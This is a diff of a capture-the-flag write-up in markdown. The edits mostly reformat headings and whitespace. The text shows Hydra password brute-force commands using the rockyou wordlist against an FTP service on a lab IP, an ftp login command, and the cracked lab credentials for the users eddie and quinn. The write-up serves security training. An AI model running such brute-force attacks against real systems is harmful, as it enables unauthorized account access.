@@ -129,7 +129,7 @@ Target IP Address: 10.10.68.75
 **Hydra Commands:**
 
       hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.68.75:10021 -t 4
-      
+  
       hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.68.75:10021 -t 4
 
 **Output:**
@@ -138,14 +138,17 @@ Target IP Address: 10.10.68.75
 
 <br>
 
-**Eddie-FTP**
-      
+**Command:**
+
       ftp 10.10.68.75 -p 10021
 
+> **Eddie-FTP**
+
    Entering `eddie` as the username and `jordan` as the password, I tried looking into files but eddie don't have the flag.
+   
 ![image](https://github.com/user-attachments/assets/3d92fd3a-ba38-4ece-b6f3-8a1b8b301178)
 
-**Quinn-FTP**
+> **Quinn-FTP**
 
    Entering `quinn` as the username and `andrea` as the password, I tried looking into files and there was the file named ftp_flag.txt. So, I downloaded it to my local machine using command
       
